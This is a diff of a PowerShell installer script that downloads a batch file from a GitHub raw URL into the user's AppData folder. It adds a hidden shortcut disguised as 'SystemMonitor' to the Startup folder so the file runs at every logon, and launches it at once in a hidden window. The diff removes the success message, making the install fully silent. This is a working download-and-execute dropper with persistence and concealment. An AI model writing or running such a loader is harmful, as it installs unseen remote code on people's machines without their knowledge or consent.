@@ -1,26 +1,23 @@
 # =============================================
-# Auto Installer for Silent Monitor
+# SILENT AUTO INSTALLER
 # =============================================
 
-$batUrl = "https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/ss.bat"
+$githubUrl = "https://raw.githubusercontent.com/Axolotl-in-void/powerhell/main/ss.bat"
 $startupFolder = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
 $batPath = "$env:APPDATA\ss.bat"
 
-# Download the latest ss.bat
 try {
-    Invoke-WebRequest -Uri $batUrl -OutFile $batPath -UseBasicParsing
-} catch {
-    exit
-}
+    Invoke-WebRequest -Uri $githubUrl -OutFile $batPath -UseBasicParsing -ErrorAction Stop
+} catch { exit }
 
-# Create shortcut in Startup folder that runs the bat hidden
+# Create hidden shortcut in startup
 $WScriptShell = New-Object -ComObject WScript.Shell
-$shortcut = $WScriptShell.CreateShortcut("$startupFolder\Monitor.lnk")
+$shortcut = $WScriptShell.CreateShortcut("$startupFolder\SystemMonitor.lnk")
 $shortcut.TargetPath = $batPath
-$shortcut.WindowStyle = 7  # Hidden
+$shortcut.WindowStyle = 7   # Hidden
 $shortcut.Save()
 
-# Run it immediately in hidden mode
+# Run now - completely hidden + detached
 Start-Process $batPath -WindowStyle Hidden
 
-Write-Host "Monitor installed and started successfully." -ForegroundColor Green
+exit
